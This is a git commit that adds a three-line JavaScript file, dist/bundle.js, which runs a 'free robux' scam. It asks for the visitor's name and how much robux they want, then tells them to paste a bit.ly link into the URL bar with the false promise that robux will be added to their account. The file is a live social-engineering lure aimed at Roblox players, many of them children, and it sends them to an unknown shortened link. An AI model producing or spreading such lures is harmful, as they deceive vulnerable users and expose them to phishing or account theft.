76156cc29bca89301b62dd734ac3a42303a81ae8
Tester284 <96301686+Tester284@users.noreply.github.com>
2022-01-04 21:33:43 +0800

    Create bundle.js

---
+++ dist/bundle.js
@@ -0,0 +1,3 @@
+prompt("Step 1: What is your name?");
+prompt("Step 2: How many robux do you want?");
+alert("Last Step: Please copy this link and paste it in your url (https://bit.ly/Free_Bobuk) and you should automatically have your robux added to your account😉");
